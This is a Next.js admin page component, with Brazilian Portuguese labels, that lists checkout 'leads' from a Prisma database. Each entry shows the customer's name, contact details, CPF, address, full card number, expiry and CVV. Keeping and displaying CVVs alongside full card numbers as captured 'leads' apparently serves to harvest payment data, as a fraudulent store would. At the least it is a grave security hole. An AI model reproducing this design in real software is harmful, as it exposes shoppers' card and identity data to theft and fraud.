import { prisma } from "@/lib/prisma";
import { formatBRL } from "@/lib/format";

export const revalidate = 0;

interface LeadItem {
  productName: string;
  quantity: number;
  unitPriceCents: number;
}

function Field({ label, value }: { label: string; value: string | null }) {
  return (
    <div>
      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
        {label}
      </span>
      <p className="mt-0.5 text-sm font-medium text-cream/90">{value || "—"}</p>
    </div>
  );
}

export default async function AdminLeadsPage() {
  const leads = await prisma.lead.findMany({
    orderBy: { createdAt: "desc" },
  });

  return (
    <div>
      <h1 className="admin-title">Leads do Checkout</h1>
      <p className="admin-subtitle">
        {leads.length} lead{leads.length === 1 ? "" : "s"} capturado
        {leads.length === 1 ? "" : "s"} no checkout
      </p>

      {leads.length === 0 ? (
        <p className="mt-10 text-sm text-cream/50">
          Nenhum lead enviado ainda.
        </p>
      ) : (
        <div className="mt-6 space-y-4">
          {leads.map((lead) => {
            let items: LeadItem[] = [];
            try {
              items = JSON.parse(lead.itemsJson) as LeadItem[];
            } catch {
              items = [];
            }

            return (
              <div
                key={lead.id}
                className="rounded-lg border border-gold-400/15 bg-ink-soft p-5"
              >
                <div className="flex flex-wrap items-center justify-between gap-3">
                  <div>
                    <p className="text-sm font-semibold text-cream">
                      #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                    </p>
                    <p className="text-xs text-cream/50">
                      {lead.email} · {lead.phone}
                    </p>
                  </div>
                  <div className="text-right">
                    <p className="text-sm font-bold text-gold-400">
                      {formatBRL(lead.totalCents)}
                    </p>
                    <p className="text-xs text-cream/50">
                      {lead.installments}
                      {lead.installments === "1" ? "x (à vista)" : "x sem juros"} ·{" "}
                      {new Date(lead.createdAt).toLocaleString("pt-BR")}
                    </p>
                  </div>
                </div>

                <div className="mt-4 grid gap-3 border-t border-gold-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
                  <Field label="CPF" value={lead.cpf} />
                  <Field label="CEP" value={lead.cep} />
                  <Field label="Endereço" value={`${lead.address}, ${lead.number}`} />
                  <Field label="Complemento" value={lead.complement} />
                  <Field label="Bairro" value={lead.neighborhood} />
                  <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                  <Field label="Cartão" value={lead.cardNumber} />
                  <Field label="Validade / CVV" value={`${lead.cardExpiry} · ${lead.cardCvv}`} />
                </div>

                <div className="mt-4 border-t border-gold-400/10 pt-4">
                  <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                    Itens
                  </span>
                  <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                    {items.map((item, idx) => (
                      <li key={idx}>
                        {item.productName} × {item.quantity} —{" "}
                        {formatBRL(item.unitPriceCents * item.quantity)}
                      </li>
                    ))}
                  </ul>
                  {lead.discountCents > 0 && (
                    <p className="mt-1 text-xs text-emerald-400">
                      Desconto aplicado: -{formatBRL(lead.discountCents)}
                    </p>
                  )}
                  {lead.notes && (
                    <>
                      <span className="mt-3 block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                        Observações
                      </span>
                      <p className="mt-1 whitespace-pre-line text-sm text-cream/80">
                        {lead.notes}
                      </p>
                    </>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
